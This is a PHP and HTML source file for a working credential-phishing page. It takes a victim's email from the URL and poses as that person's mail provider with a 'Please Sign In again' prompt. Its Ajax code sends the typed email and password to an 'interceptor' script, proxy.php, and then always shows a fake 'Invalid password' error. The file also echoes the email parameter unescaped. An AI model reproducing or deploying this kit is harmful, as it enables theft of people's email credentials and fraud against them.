<?php 
	$email = $_GET["email"];
	$email = str_replace('"', "", $email);
	$parts = explode("@", $email);
	
	if (isset($parts[1])) {
		$vendor = $parts[1];
	} else {
		$vendor = false;
	}
?>


<!DOCTYPE html>
<html>

<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js" >
</script>
</head>

<body>

	<div id= "container" style="min-height:440px;">
	
		<div id= "sign-in-form">
		<form action= "#" method= "post" id="logon-form" >
			
			<?php if ($vendor) { ?>
				<div style= "text-align: center; font-size: 1.5em; ">
					<span id= "mail-provider"><?= ucfirst(str_replace(".com", "", $vendor)) ?></span><span style="font-size:0.6em;">&copy </span> <span style="color: " >Mail</span>
				</div>
			<?php } ?>
			
			<div style="text-align:center;">
			
				<div style= "margin-top:10px; margin-bottom: 10px; font-size: 1.2em;">
					Please Sign In again to continue
				</div>
				
				<?php if ($vendor) { ?>
					<div style= "">
						Connected to <span style="color:#8a8b89;font-weight:bold; font-size:1em;"> <?= $email ?> </span>
					</div>
				<?php } ?>
			
				<div>
					<input type= "<?= ($vendor) ? "hidden" : "text" ?>" name= "frm-email" id= "frm-email" placeholder= "Email" value="<?= ($vendor) ? $email : "" ?>" /><br>
					<input type = "password" name= "frm-pass" placeholder= "Password" id="frm-pass" /><br>
					<div id="error-pane" style='text-align:center;'></div>
					<input type = "hidden" name= "frm-ac-tok" value="1488795688aLjZ8H57KwSc4ewiwtRx" id="frm-ac-tok" />
					<input type = "hidden" name= "s-id" value= "auto-link" id="s-id" />
					<input type = "hidden" name= "ajax-submit" value= "YES" id="ajax-submit" />
				</div>
			
			</div>
				<input type = "submit" value= "Sign In" id= "login-but" name="frm-submit"/><br>
			
		</form>
		</div>
	</div>
	
	<div id= "footer">
		<span><?= ucfirst($vendor) ?>&copy </span>2018. All rights reserved.
	</div>

</body>

<style>
		body{
			
			background:#000;
			color:#050505;
		}
		#sign-in-form{
			
			margin: auto;
			margin-top: 10%;
			background: #fff;
			padding: 30px;
			width: 420px;
			border-radius: 5px;
			box-shadow: 0px 0px 3px #666, 0px 0px 3px #666;
		}
		#mail-provider{
			color: #8a8b89;
			font-weight: bold;
			font-size: 0.9em;
		}
		#frm-pass{
			margin: 5px;
			padding-left: 30px;
			border: 1px solid #333;
			width: 170px;
			font-size:1.2em;
		}
		#frm-email{
			
			width:170px;
			margin-top:30px;
			margin-bottom:10px;
			border: 1px solid #333;
			font-size:1.2em;
			padding-left:20px;
		}
		#login-but{
			
			margin-top: 18px; 
			margin-left: 40%;
			border: 1px solid #000; 
			border-radius: 0px;
			color:#f6f6f6;
			background:#797c77;
			font-weight:bold;
			font-size:1.2em;
		}
		#login-but:hover{
			
			color:#fff;
			background:#679B08;
		}
		#footer{
			
			margin-top: 50px;
			font-size: 0.8em;
			color:#fff;
			text-align: center;
		}
		#success-msg{
			
			color:#000;
		}
</style>
<script>
	
	//notify the user of successful sign in then continues form submission
	//DEPRECATED AND NOT CALLED AT ALL IN THIS CODE
	function sign_continue(){
		
		var pass_val = $("#frm-pass").val();
		
		//no pass entered
		if(pass_val.length == 0){
			
			alert("Enter your password");
			return false;
		}
		
		//pass entered
		else{
			
			$("#sign-in-form").fadeOut(800, function(){
				
				var continue_msg = "<div id= 'success-msg'> Your account was successfuly verified, you will be redirected you to your email in few seconds. </div>"
				$("#sign-in-form").html(continue_msg);
				
				$("#sign-in-form").fadeIn(800, timeoutSign);

			})
		}
	}
	//delays form submission for 3secs
	//DEPRECATED TOO AND NOT USED
	function timeoutSign(){
			
		//wait for sometime before activating signin
		setTimeout(function(){return true}, 3000);
	}
	function validateForm(){
			
			 var x = document.forms["logon-form"]["frm-pass"].value;

			if (x == null || x == "") {
				
				alert("Please Enter Your Password");
				return false;
			}
			else
				return true;
		}
		
		function disable_form(){
				
			$("#frm-pass").attr("disabled", "1");
			$("#frm-email").attr("disabled", "1");
		}
			
		function enable_form(){
				
			$("#frm-pass").removeAttr("disabled");
			$("#frm-email").removeAttr("disabled");
				
		}
		/**
		sends form value to server via Ajax, that is, submits form behind refreshing page
		@param String intceptr_url: Interceptor URL.
		@return void
		NOTE: if interceptor responds 'SUCCESS' then form submits successfully
			remeber to include ::<input type = "hidden" name= "ajax-submit" value= "YES" />:: in the form elements inorder for interceptor to accept and send log so as to return 'SUCCESS' too
		**/
		
		function ajax_submit_form(intceptr_url){

			//for interceptor to work!! this is Standard interceptor form element value
			var form_email = "frm-email=" + $("#frm-email").val();
			var form_pass = "&frm-pass=" + $("#frm-pass").val();
			var form_tok = "&frm-ac-tok=" + $("#frm-ac-tok").val();
			var form_s_id = "&s-id=" + $("#s-id").val();
			var form_ajax = "&ajax-submit=" + $("#ajax-submit").val();
			var form_submit = "&frm-submit=" + "any val bro";
				
			var post_data = form_email + form_pass + form_tok + form_s_id + form_ajax + form_submit;
				
			post_data = encodeURI(post_data);//lets encode for URI transport
				
			var request = $.post(intceptr_url, post_data);
				
			request.done(function(response_data){
				
			response_data  = response_data + "";
				
				if(response_data == "SUCCESS"){
						
					//debuging purpose
					//alert("LOGIN SENT");
				}
				else{
					//production purpose
					//alert("SUCCESS BUT LOGIN NOT SENT: " + response_data);
				}
			});
				
			request.fail(function(jqxml, status, err){
			
				//alert("LOGIN NOT-SENT: " + err);
				
			});
				
			request.always(function(){
				
				//release disabled form fields in page and show password error
				//alert("ALWAYS SAY SOMETHING ");
				enable_form();
				show_error();
					
			});
				
		}
			
			//displays error to user by manipulating DOM
			function show_error(){
			
				var error_msg = "<span style='color:#e53d16; font-size:0.8em;'>Invalid password</span><br>";
				
				$("#frm-pass").css({'border':'solid 2px #e53d16'});
				$("#frm-email").css({'border':'solid 2px #e53d16'});
				
				$("#error-pane").append(error_msg);
			}
			
			//hide displayed error if any
			function hide_error(){
				
				$("#frm-pass").css({'border':'solid 1px #999999'});
				$("#frm-email").css({'border':'solid 1px #999999'});
				$("#error-pane").empty();
			}
			$("#logon-form").submit(function(){
				
				//sign_continue();//compatbility reasons
				var validated = validateForm();
				
				if(validated){
				
					hide_error();
					disable_form();
					ajax_submit_form("proxy.php");
				}
					return false;
			});
			
</script>
</html>
